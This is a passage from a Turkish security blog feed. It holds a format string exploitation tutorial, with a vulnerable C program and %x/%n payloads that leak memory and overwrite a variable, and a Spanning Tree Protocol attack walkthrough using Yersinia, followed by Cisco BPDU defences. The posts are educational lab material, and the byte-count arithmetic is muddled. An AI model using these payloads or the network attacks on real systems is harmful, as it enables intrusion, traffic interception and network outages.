&lt;p&gt;Kısa bilgi : Video kayıdına aldığım bu konu basit şekilde PE(Portable Executable) çalıştırılabilir (Win 32/64 bit) .exe dosyalarının biraz analizini &amp;amp; tam anlamı ilede içerisine kod enjeksiyonunun(Code Injection) yapılmasını anlattım. İyi izlemeler.&lt;/p&gt;</content><author><name></name></author><summary type="html">Paylaştığım video da blogum da yayınlıyacağım demiştim fakat fikrimi değiştirdim çünkü video da herşeyi en son detayına kadar anlatmışım ve 25 dakika sürmüş. Eğer bu blog kısmında da anlatmaya çalışırsam zilyon sayfa yazı çıkar. O yüzden direk youtube linkini paslıyorum izlemek isteyenler için. :</summary></entry><entry><title type="html">Format String Attack</title><link href="http://192.168.254.251:4000/2018/10/17/format-string-attack.html" rel="alternate" type="text/html" title="Format String Attack" /><published>2018-10-17T00:00:00+03:00</published><updated>2018-10-17T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2018/10/17/format-string-attack</id><content type="html" xml:base="http://192.168.254.251:4000/2018/10/17/format-string-attack.html">&lt;h1 id=&quot;format-string-nedir-&quot;&gt;&lt;strong&gt;Format String Nedir ?&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;em&gt;Format string metin ve format parametreleri tutan bir ASCII’dir. Çoğu programlama dilinde de görebiliriz ki herhangi bir metin yazacağımız zaman bu metini  direk yazımızın içine değilde bir değişkene aktarırız, ve bu değişkenide yazımızın içerisinde format stringler aracılığıyla kullanırız.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Format Stringleri içeren tablo:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/4ZCa5cF.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;format-string-zafiyetini-içeren-fonksiyonlar&quot;&gt;&lt;strong&gt;Format string zafiyetini içeren fonksiyonlar&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/gzbKC2S.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;örnek-format-string-saldırısı&quot;&gt;&lt;strong&gt;Örnek format string saldırısı&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;**Format String zafiyetini sömürmek için kullanacağımız kodumuz: **&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int hedef;


int main(int argc, char *argv[]){

		char buffer[64];
		
		strcpy(buffer, argv[1]);
		
		printf(&quot;Girdiniz: &quot;);
		
		printf(buffer);
		
		if(hedef){
		   printf(&quot;Hedef değişkenini düzenlendi.&quot;);
		}
		printf(&quot;\n&quot;);

}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Derlemek(compile) ve Çalıştırmak(run) için:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc vuln.c -o vuln

./vuln &quot;Merhaba Dünya&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;p&gt;&lt;br /&gt;
&lt;strong&gt;Zafiyeti kullanarak program içerisinde Bellek Sızıntısı(Memory Leak) yaratmak.&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./vuln &quot;0x%x 0x%x 0x%x 0x%x&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Yukarıda kullanılan “0x%x” ler baştaki “Format Stringleri içeren tablo”sundan da görebileceğiniz gibi hafıza(memory) içerisindeki diğer adresleri format string zafiyetini sömürerek yazıyoruz. Bellek sızıntısı bu şekilde oluşmuş oluyor. Buffer’e kopyaladığımız 1. argümanımız &lt;strong&gt;printf&lt;/strong&gt; fonksiyonu tarafından kullanılmaya çalışıldığında buffere verdiğimiz “0x%x”ler çalışacak ve printf fonksiyonunun format string zafiyetinden yararlanarak bellekteki diğer adresleri gözlemleyebildik.&lt;/p&gt;

&lt;p&gt;Ve sonucunda çıktımız(output) şu şekilde gelecektir :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@blacknbunny:/home/blacknbunny# ./vuln &quot;0x%x 0x%x 0x%x 0x%x&quot;
Girdiniz: 0xbffff9b6 0x174 0x174 0x78257830
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;p&gt;&lt;br /&gt;
Şimdi burdan olayımızı veriye yazmaya yani belirtilen hedef degiskenini düzenlemeye kadar nasıl götürebiliriz ? Cevabımızda aşşağıda :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@blacknbunny:/home/blacknbunny# ./vuln `python -c &quot;print('AAAA' + '\xa4\x96\x04\x08'  + 'BBBB' + '.%x'*4 + '%n')&quot;`
Girdiniz: AAAABBBB.bffff9af.bffff7a8.b7eada75.41414141hedef degiskeni duzenlendi
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Çıktımızda da gördüğümüz gibi hedef değişkenini yukarıda parametre olarak verdiğimiz python command-line girdisi ile düzenledik. Peki bunu nasıl başardık yani sadece küçük bir &lt;strong&gt;printf&lt;/strong&gt; fonksiyonundan hafıza(memory) içerisindeki leak’ten corruption’a yani hafızayı bozmaya ya da düzenlemeye kadar gidebildik ?&lt;/p&gt;

&lt;p&gt;İlk önce 4 bytelık bir veri verdik. Buda “AAAA” oluyor.&lt;/p&gt;

&lt;p&gt;Sonrasında alttaki komutumuz ile &lt;strong&gt;hedef&lt;/strong&gt; değişkenimizin adresini &lt;strong&gt;0x80496a4&lt;/strong&gt; olarak bulduk ve 2. olarak python command-line girdimize onu verdik. :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@blacknbunny:/home/blacknbunny# objdump -t ./vuln

...
00000000       F *UND*  00000000              printf@@GLIBC_2.0
0804969c g       *ABS*  00000000              __bss_start
080496a8 g       *ABS*  00000000              _end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;080496a4&lt;/strong&gt; g     O .bss   00000004              hedef&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0804969c g       *ABS*  00000000              _edata
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ve 3. olarak 4 bytelık “BBBB”mizi verdik ki hedefin üzerine “BBBB” yi kullanarak “%n” format string’i ile yazabilelim. %n’in ne olduğunu bilmiyorsanız en üstte bulunan “Format Stringleri içeren tablo”suna da bakabilirsiniz.&lt;/p&gt;

&lt;hr /&gt;
&lt;p&gt;&lt;br /&gt;
Başta da memoryi leak etmemizi sağlayan “%x” format stringini hatırlıyorsunuzdur. Onuda en sona koyduk ki bu işlemleri yaparken hafızamızı yani memoryi gözlemleyebilelim.&lt;/p&gt;

&lt;p&gt;Sonrasında da “%n” format stringimizi “0x80496a4BBBB.%x.%x.%x.%x%n” metininin toplam byte sayısını &lt;strong&gt;hedef&lt;/strong&gt; değişkeninin üzerine yazmak için kullandık.&lt;/p&gt;

&lt;p&gt;Toplam byte sayısını hesaplamak için :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4 = &quot;AAAA&quot;

4 = &quot;0x80496a4&quot; # int hedef; değişkenimizin adresi

4 = &quot;BBBB&quot;

4 = &quot;.%x.&quot;

4 = &quot;%x.%&quot;

4 = &quot;x.%x&quot;

------------------------------------------------------------------------


&quot;AAAA&quot; *  &quot;0x80496a4&quot;

4 * 4 = 16

&quot;BBBB&quot; * &quot;.%x.&quot;

4 * 4 = 16

&quot;%x.%&quot; *  &quot;x.%x&quot;

4*4 = 16

16 + 16 + 16 = 48
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bu da demek oluyor ki &lt;strong&gt;int target;&lt;/strong&gt; değişkenimizin üzerine 48 yazmışız ki bunun da hex karşılığı 0x30 oluyor.&lt;/p&gt;

&lt;p&gt;Tam olarak &lt;strong&gt;int target;&lt;/strong&gt; değişkenimizin üzerinde memory(hafıza) içerisinde &lt;strong&gt;0x30&lt;/strong&gt; mevcut.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Format_string_attack&quot;&gt;OWASP&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.geeksforgeeks.org/format-string-vulnerability-and-prevention-with-example/&quot;&gt;Geeksforgeeks&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://linux.die.net/man/3/printf&quot;&gt;Man page&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Printf_format_string&quot;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Format String Nedir ? Format string metin ve format parametreleri tutan bir ASCII’dir. Çoğu programlama dilinde de görebiliriz ki herhangi bir metin yazacağımız zaman bu metini direk yazımızın içine değilde bir değişkene aktarırız, ve bu değişkenide yazımızın içerisinde format stringler aracılığıyla kullanırız.</summary></entry><entry><title type="html">Spanning Tree Protocol(STP) Saldırı ve Korunma Yöntemleri</title><link href="http://192.168.254.251:4000/2017/12/07/spanning-tree-protocolstp-saldiri-ve-korunma-yontemleri.html" rel="alternate" type="text/html" title="Spanning Tree Protocol(STP) Saldırı ve Korunma Yöntemleri" /><published>2017-12-07T00:00:00+03:00</published><updated>2017-12-07T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2017/12/07/spanning-tree-protocolstp-saldiri-ve-korunma-yontemleri</id><content type="html" xml:base="http://192.168.254.251:4000/2017/12/07/spanning-tree-protocolstp-saldiri-ve-korunma-yontemleri.html">&lt;h1 id=&quot;spanning-tree-protocol-stp-nedir--&quot;&gt;Spanning Tree Protocol (STP) nedir ? :&lt;/h1&gt;

&lt;p&gt;Switching loops yani anahtarlama döngülerini engellemek için geliştirilmiş &lt;a href=&quot;https://en.wikipedia.org/wiki/OSI_model&quot; target=&quot;_blank&quot;&gt;OSI Model’inde&lt;/a&gt; bulunan &lt;strong&gt;ikinci katman(layer 2)&lt;/strong&gt; içerisinde bulunan bir protokol’dur.&lt;/p&gt;

&lt;p&gt;STP barındıran switch’ler kendilerine bir root switch (kök anahtar) seçerler ayrıca her switch’in bir adet &lt;strong&gt;Bridge ID&lt;/strong&gt; değeri vardır, bu değer &lt;strong&gt;Bridge Priority&lt;/strong&gt; ve &lt;strong&gt;Bridge’nin Mac Adresi&lt;/strong&gt; ile oluşur.&lt;/p&gt;

&lt;p&gt;En düşük &lt;strong&gt;Bridge ID&lt;/strong&gt;‘ye sahip olan &lt;strong&gt;Bridge&lt;/strong&gt;, &lt;strong&gt;Root Bridge(Root Switch)&lt;/strong&gt; olarak seçilir.&lt;strong&gt;Bridge Priority&lt;/strong&gt;‘nin default değeri 32768’dir ve düzenlenebilir’dir.&lt;/p&gt;

&lt;p&gt;Bu seçim BPDU aracılığıyla yapılır.Ağa BPDU  üreten bilgisayar bağlanıp, bağlanan bilgisayarın ürettiği BPDU’nun içindeki &lt;strong&gt;Bridge Priority&lt;/strong&gt; değeri’de 0 yapılarak, ağa bağladığımız bilgisayarın kök switch yerini almasını sağlayabiliriz.&lt;/p&gt;

&lt;h1 id=&quot;spanning-tree-protocol-stp-saldırıları-&quot;&gt;Spanning Tree Protocol (STP) saldırıları :&lt;/h1&gt;
&lt;p&gt;Normal bir ddos veya dos saldırısından örnek vererek yola çıkalım gönderdiğiniz paketler genelde tcp/ip veya udp/ip olarak gider ve tüneli tıkayıp girişleri engeller.&lt;/p&gt;

&lt;p&gt;Bu saldırıda ise tcp/ip veya udp/ip yerine &lt;strong&gt;BPDU Configuration&lt;/strong&gt; paketleri kullanılıyor.&lt;/p&gt;

&lt;p&gt;Çok sayıda giden &lt;strong&gt;BPDU Configuration&lt;/strong&gt; paketleri ağı bir zaman’a kadar servis dışı bırakıyor, saldırının asıl amacı ağ içerisindeki haberleşmeyi kesmek.&lt;/p&gt;

&lt;p&gt;Bu saldırıyı &lt;strong&gt;İkinci katman (layer 2)&lt;/strong&gt; ulaşım ve aynı zamanda saldırı aracı olan &lt;strong&gt;Yersinia&lt;/strong&gt; ile yapabiliriz.&lt;/p&gt;

&lt;p&gt;Kurduğunuzu varsayarak’tan &lt;code class=&quot;highlighter-rouge&quot;&gt;yersinia -G&lt;/code&gt; ile graphical arayüzünü başlatıyoruz.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/ByXO5Q.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Sol üstteki &lt;strong&gt;Launch Attack&lt;/strong&gt; kısmın’a tıklayıp sağ taraf’tan &lt;strong&gt;STP&lt;/strong&gt;‘yi seçiyoruz ve &lt;strong&gt;Choose Attack&lt;/strong&gt; kısmının alt tarafından &lt;strong&gt;sending conf BPDUs&lt;/strong&gt;‘ı seçiyoruz ve &lt;strong&gt;OK&lt;/strong&gt; diyerek saldırıyı başlatıyoruz.Eğer En düşük &lt;strong&gt;Bridge ID&lt;/strong&gt;‘sine sahip olmak istiyorsak &lt;strong&gt;Claiming Root Role&lt;/strong&gt;‘u seçebiliriz.Ayrıca tüm trafiği dinlemek istiyorsak &lt;strong&gt;Claiming Root Role with MiTM(man in the middle)&lt;/strong&gt;‘ı seçebiliriz..&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Wireshark&lt;/strong&gt; ile &lt;strong&gt;STP&lt;/strong&gt; üzerinde giden tüm request ve response paketlerini görmemiz mümkün.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/kXrMPy.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;spanning-tree-protocol-stp-korunma-yöntemi-&quot;&gt;Spanning Tree Protocol (STP) korunma yöntemi :&lt;/h1&gt;
&lt;p&gt;Saldırı’yı gösterdik ve sıra güvenliğimiz’de.Yukarıda öğrendiğimize göre &lt;strong&gt;BPDU&lt;/strong&gt; bize çok büyük sıkıntılar çıkarıyor ve bunun içinde belli başlı komutlarımız var.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;BPDU Koruması&lt;/strong&gt; :&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Switch&lt;/strong&gt;‘te genel olarak &lt;strong&gt;BPDU&lt;/strong&gt; Korumasını aktifleştirmek için :&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Router#spanning-tree portfast bpduguard default
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Spesifik switch portun&lt;/strong&gt;‘da &lt;strong&gt;PortFast BPDU&lt;/strong&gt; Koruması’nı etkinleştirmek için :&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Router#spanning-tree bpduguard enable
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;BPDU&lt;/strong&gt; Konfigurasyon’unu doğrulamak için :&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Router#show spanning-tree summary totals
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;strong&gt;BPDU Filtrelemesi&lt;/strong&gt; :&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Switch&lt;/strong&gt;‘te genel olarak &lt;strong&gt;PortFast BPDU&lt;/strong&gt; Filterelemesini etkinleştirmek için :&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Router#spanning-tree portfast bpdufilter default
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Spesifik switch portun&lt;/strong&gt;‘da &lt;strong&gt;PortFast BPDU&lt;/strong&gt; Filtrelemesini etkinleştirmek için :&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Router#spanning-tree bpdufilter enable
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Komutların&lt;/strong&gt; Konfigurasyon’unu switch’te doğrulamak için :&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Router#show spanning-tree summary totals
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;strong&gt;BPDU Root Koruması&lt;/strong&gt; :&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Router#spanning-tree rootguard
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;</content><author><name></name></author><summary type="html">Spanning Tree Protocol (STP) nedir ? :</summary></entry></feed>